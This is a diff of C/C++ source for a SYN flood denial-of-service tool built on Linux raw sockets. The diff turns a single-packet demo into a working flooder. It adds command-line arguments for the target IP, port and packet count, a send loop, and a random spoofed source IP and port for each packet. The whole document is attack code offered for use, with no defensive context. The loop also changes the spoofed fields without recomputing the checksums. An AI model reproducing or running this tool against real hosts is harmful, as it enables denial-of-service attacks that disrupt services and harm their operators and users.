@@ -1,13 +1,20 @@
-/*
-	Syn Flood DOS with LINUX sockets
-*/
-#include<stdio.h>
-#include<string.h> //memset
-#include<sys/socket.h>
-#include<stdlib.h> //for exit(0);
-#include<errno.h> //For errno - the error number
-#include<netinet/tcp.h>	//Provides declarations for tcp header
-#include<netinet/ip.h>	//Provides declarations for ip header
+/* Syn Flood DOS with LINUX sockets */
+#include <stdio.h>
+#include <string.h>    	 //Use memset
+#include <sys/socket.h>	 //Use linux sockets
+#include <stdlib.h> 		 //for exit(0);
+#include <errno.h> 			 //For errno - the error number
+#include <netinet/tcp.h> //Provides declarations for tcp header
+#include <netinet/ip.h>	 //Provides declarations for ip header
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <iostream>
+
+using namespace std;
+
+//TODO: check sudo give warning
+//TODO: convert to c++
 
 struct pseudo_header    //needed for checksum calculation
 {
@@ -16,11 +23,11 @@ struct pseudo_header    //needed for checksum calculation
 	unsigned char placeholder;
 	unsigned char protocol;
 	unsigned short tcp_length;
-	
+
 	struct tcphdr tcp;
 };
 
-unsigned short csum(unsigned short *ptr,int nbytes) {
+unsigned short checksum(unsigned short *ptr,int nbytes) {
 	register long sum;
 	unsigned short oddbyte;
 	register short answer;
@@ -39,31 +46,48 @@ unsigned short csum(unsigned short *ptr,int nbytes) {
 	sum = (sum>>16)+(sum & 0xffff);
 	sum = sum + (sum>>16);
 	answer=(short)~sum;
-	
+
 	return(answer);
 }
 
-int main (void)
+int main(int argc, char *argv[])
 {
+	if(geteuid()!=0)
+	{
+	  printf("Run with root privileges.\n");
+		exit(-1);
+	}
+	if(argc<4)
+	{
+		printf("Usage: ./syn_flooding dst_ip dst_port pckt_count\n");
+		exit(-1);
+	}
+	//Use provided args for spoofing
+	char *dst_ip=argv[1];
+	unsigned short dst_port=stoi(argv[2]);
+	unsigned int pckt_count=stoi(argv[3]);
 	//Create a raw socket
 	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
 	//Datagram to represent the packet
-	char datagram[4096] , source_ip[32];
+	char datagram[4096];
 	//IP header
 	struct iphdr *iph = (struct iphdr *) datagram;
 	//TCP header
 	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
 	struct sockaddr_in sin;
 	struct pseudo_header psh;
-	
-	strcpy(source_ip , "192.168.1.2");
-  
+
 	sin.sin_family = AF_INET;
-	sin.sin_port = htons(80);
-	sin.sin_addr.s_addr = inet_addr ("1.2.3.4");
-	
-	memset (datagram, 0, 4096);	/* zero out the buffer */
-	
+	sin.sin_port = htons(dst_port);
+	sin.sin_addr.s_addr = inet_addr(dst_ip);
+
+	memset(datagram, 0, 4096);	/* zero out the buffer */
+
+	//Initialization
+	srand(time(NULL));
+	char src_ip[16];
+	sprintf(src_ip, "192.168.%u.%u", rand()%255, rand()%255);
+	unsigned short src_port=rand()%65536;
 	//Fill in the IP Header
 	iph->ihl = 5;
 	iph->version = 4;
@@ -74,14 +98,14 @@ int main (void)
 	iph->ttl = 255;
 	iph->protocol = IPPROTO_TCP;
 	iph->check = 0;		//Set to 0 before calculating checksum
-	iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
+	iph->saddr = inet_addr(src_ip);	//Spoof the source ip address
 	iph->daddr = sin.sin_addr.s_addr;
-	
-	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
-	
+
+	iph->check = checksum ((unsigned short *) datagram, iph->tot_len >> 1);
+
 	//TCP Header
-	tcph->source = htons (1234);
-	tcph->dest = htons (80);
+	tcph->source = htons(src_port);  //Src port no
+	tcph->dest = htons(dst_port); 	 //Dst port no
 	tcph->seq = 0;
 	tcph->ack_seq = 0;
 	tcph->doff = 5;		/* first and only tcp segment */
@@ -96,45 +120,50 @@ int main (void)
 				should fill in the correct checksum during transmission */
 	tcph->urg_ptr = 0;
 	//Now the IP checksum
-	
-	psh.source_address = inet_addr( source_ip );
+
+	psh.source_address = inet_addr(src_ip);
 	psh.dest_address = sin.sin_addr.s_addr;
 	psh.placeholder = 0;
 	psh.protocol = IPPROTO_TCP;
 	psh.tcp_length = htons(20);
-	
-	memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
-	
-	tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
-	
+
+	memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
+
+	tcph->check = checksum((unsigned short*) &psh, sizeof(struct pseudo_header));
+
 	//IP_HDRINCL to tell the kernel that headers are included in the packet
 	int one = 1;
 	const int *val = &one;
-	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
+	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
 	{
-		printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
+		printf("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
 		exit(0);
 	}
-	
-	//Uncommend the loop if you want to flood :)
-	//while (1)
-	//{
+  printf("Sending %d packets...\n", pckt_count);
+	while(pckt_count--)
+	{
 		//Send the packet
-		if (sendto (s,		/* our socket */
-					datagram,	/* the buffer containing headers and data */
+		if (sendto (s,			/* our socket */
+					datagram,			/* the buffer containing headers and data */
 					iph->tot_len,	/* total length of our datagram */
-					0,		/* routing flags, normally always 0 */
+					0,						/* routing flags, normally always 0 */
 					(struct sockaddr *) &sin,	/* socket addr, just like in */
-					sizeof (sin)) < 0)		/* a normal send() */
+					sizeof(sin)) < 0)				/* a normal send() */
 		{
-			printf ("error\n");
+			printf("Error\n");
 		}
 		//Data send successfully
 		else
 		{
-			printf ("Packet Send \n");
+			printf("Sent.\n");
 		}
-	//}
-	
+		//Change source IP & port with rand
+		sprintf(src_ip, "192.168.%u.%u", rand()%255, rand()%255);
+		src_port=rand()%65536;
+		iph->saddr = inet_addr(src_ip);	//Spoof the source ip address
+		tcph->source = htons(src_port); //Src port no
+		psh.source_address = inet_addr(src_ip);
+	}
+
 	return 0;
 }
